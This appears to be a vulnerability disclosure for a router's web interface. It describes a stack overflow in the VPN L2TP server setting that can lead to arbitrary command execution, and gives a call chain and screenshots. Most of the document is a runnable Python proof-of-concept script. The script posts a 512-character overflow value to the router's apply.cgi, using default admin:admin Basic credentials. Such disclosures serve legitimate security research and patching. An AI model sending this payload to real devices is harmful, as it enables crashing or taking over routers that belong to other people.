The `vpn_l2tp_server` variable is passed in from the Web and obtained via the `nvram_get` function in `reselov_vpn_server`, causing a stack overflow vulnerability that can lead to arbitrary command execution.

main-->syb_40C360-->start_single_service-->connect_vpn-->reselov_vpn_server
<img width="620" height="506" alt="image" src="https://github.com/user-attachments/assets/cbd01058-3fae-4658-b1f0-79a7fff9b944" />
<img width="801" height="605" alt="image" src="https://github.com/user-attachments/assets/c11e8b46-3d20-4025-9075-f4c57637557a" />
<img width="889" height="501" alt="image" src="https://github.com/user-attachments/assets/70415acb-e3e9-4430-b0ae-43886ed466e2" />
<img width="865" height="524" alt="image" src="https://github.com/user-attachments/assets/3a61a33b-2415-48f1-b9be-bf63ef899448" />
<img width="705" height="460" alt="image" src="https://github.com/user-attachments/assets/df863142-0101-4dcf-af97-7dc7737179e5" />

```
poc
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
VPN L2TP - Server Injection
"""

import requests
import json
from urllib.parse import urlencode

requests.packages.urllib3.disable_warnings()

request = {
    "name": "VPN L2TP - Server Injection",
    "method": "POST",
    "url": "http://192.168.10.1/apply.cgi",
    "referer": "http://192.168.10.1/VPN_L2TP.asp",
    "headers": {
        "Cache-Control": "max-age=0",
        "Authorization": "Basic YWRtaW46YWRtaW4=",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
    },
    "data": {
        "submit_button": "VPN_L2TP",
        "change_action": "",
        "vpn_l2tp_auto": "0",
        "vpn_l2tp_only": "0",
        "vpn_type": "",
        "vpn_l2tp_enable": "0",
        "vpn_nat_enable": "1",
        "vpn_dns_enable": "1",
        "action": "Apply",
        "vpn_l2tp_server": "1" * 512,
        "vpn_l2tp_username": "aaaaa",
        "vpn_l2tp_passwd": "",
        "vpnc_auth": "0",
        "vpn_l2tp_mppe": "0",
        "vpnc_stateful": "0",
        "vpn_l2tp_mtu": "1450",
        "vpn_l2tp_mru": "1450",
        "vpn_client_ip": " ",
        "vpn_l2tp_redial_count": "5",
        "vpn_l2tp_redial_intervals": "10",
        "vpn_dst_enable": "0",
        "vpn_check_mode": "1",
        "vpn_check_interval": "10",
        "vpn_check_number": "5",
        "web_vpn_nat_enable": "on",
        "web_vpn_dns_enable": "on",
    },
}


def send_request():
    """发送HTTP POST请求"""
    try:
        headers = request["headers"].copy()
        headers["Origin"] = "http://192.168.10.1"
        headers["Referer"] = request["referer"]

        print(f"[*] 发送请求: {request['name']}")
        print(f"[*] URL: {request['url']}")
        print(f"[*] Referer: {request['referer']}")
        print(
            f"[*] 数据长度: {sum(len(str(v)) for v in request['data'].values())} bytes\n"
        )

        response = requests.post(
            request["url"],
            data=request["data"],
            headers=headers,
            timeout=10,
            verify=False,
        )

        print(f"[+] 状态码: {response.status_code}")
        print(f"[+] 响应长度: {len(response.text)} bytes")
        print(f"[+] 响应头: {dict(response.headers)}\n")

        return response
    except Exception as e:
        print(f"[-] 错误: {e}\n")
        return None


if __name__ == "__main__":
    send_request()

```
